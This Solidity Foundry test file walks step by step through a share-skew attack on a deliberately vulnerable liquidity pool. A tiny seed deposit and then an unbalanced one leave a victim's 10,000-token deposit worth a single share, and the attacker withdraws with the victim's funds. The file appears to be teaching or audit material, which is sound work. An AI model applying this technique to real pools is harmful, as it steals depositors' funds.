// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Token} from "../src/Token.sol";
import {PoolNoLock} from "../src/vulnerable/PoolNoLock.sol";

contract FirstDepositorAttackTest is Test {
    Token token0;
    Token token1;
    PoolNoLock pool;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        token0 = new Token("Token 0", "T0");
        token1 = new Token("Token 1", "T1");
        pool = new PoolNoLock(token0, token1);

        token0.mint(attacker, 100_000);
        token1.mint(attacker, 100_000);

        token0.mint(victim, 10_000);
        token1.mint(victim, 10_000);

        vm.startPrank(attacker);
        token0.approve(address(pool), type(uint256).max);
        token1.approve(address(pool), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(victim);
        token0.approve(address(pool), type(uint256).max);
        token1.approve(address(pool), type(uint256).max);
        vm.stopPrank();
    }

    function test_FirstDepositorAttackStealsFromVictim() public {
        // Record both participants' starting balances.
        uint256 attackerToken0Start = token0.balanceOf(attacker);
        uint256 attackerToken1Start = token1.balanceOf(attacker);
        uint256 victimToken0Start = token0.balanceOf(victim);
        uint256 victimToken1Start = token1.balanceOf(victim);

        // Step 1: attacker creates a tiny pool with 4 / 4.
        vm.prank(attacker);
        uint256 initialShares = pool.addLiquidity(4, 4);

        assertEq(initialShares, 4);
        assertEq(pool.shares(attacker), 4);
        assertEq(pool.totalShares(), 4);
        assertEq(pool.reserve0(), 4);
        assertEq(pool.reserve1(), 4);

        // Step 2: attacker skews the reserves with an unbalanced deposit.
        vm.prank(attacker);
        uint256 skewShares = pool.addLiquidity(30_000, 1);

        assertEq(skewShares, 1);
        assertEq(pool.shares(attacker), 5);
        assertEq(pool.totalShares(), 5);
        assertEq(pool.reserve0(), 30_004);
        assertEq(pool.reserve1(), 5);

        // Step 3: victim deposits 10,000 of each token but receives
        // only one share because the smaller ratio determines the mint.
        vm.prank(victim);
        uint256 victimSharesMinted = pool.addLiquidity(10_000, 10_000);

        assertEq(victimSharesMinted, 1);
        assertEq(pool.shares(attacker), 5);
        assertEq(pool.shares(victim), 1);
        assertEq(pool.totalShares(), 6);
        assertEq(pool.reserve0(), 40_004);
        assertEq(pool.reserve1(), 10_005);

        // Attacker withdraws first.
        // Read shares before setting the prank.
        uint256 attackerSharesToWithdraw = pool.shares(attacker);

        vm.prank(attacker);
        (uint256 attackerOut0, uint256 attackerOut1) = pool.removeLiquidity(attackerSharesToWithdraw);

        assertEq(attackerOut0, 33_336);
        assertEq(attackerOut1, 8_337);

        assertEq(token0.balanceOf(attacker), 103_332);
        assertEq(token1.balanceOf(attacker), 108_332);

        assertEq(pool.reserve0(), 6_668);
        assertEq(pool.reserve1(), 1_668);
        assertEq(pool.totalShares(), 1);

        // Victim withdraws the remaining pool.
        uint256 victimSharesToWithdraw = pool.shares(victim);

        vm.prank(victim);
        (uint256 victimOut0, uint256 victimOut1) = pool.removeLiquidity(victimSharesToWithdraw);

        assertEq(victimOut0, 6_668);
        assertEq(victimOut1, 1_668);

        assertEq(pool.totalShares(), 0);
        assertEq(pool.reserve0(), 0);
        assertEq(pool.reserve1(), 0);

        // Attacker's gains.
        assertEq(token0.balanceOf(attacker) - attackerToken0Start, 3_332);
        assertEq(token1.balanceOf(attacker) - attackerToken1Start, 8_332);

        // Victim's losses must match the attacker's gains.
        assertEq(victimToken0Start - token0.balanceOf(victim), 3_332);
        assertEq(victimToken1Start - token1.balanceOf(victim), 8_332);

        // Final wallet balances make the outcome explicit.
        assertEq(token0.balanceOf(victim), 6_668);
        assertEq(token1.balanceOf(victim), 1_668);
    }
}
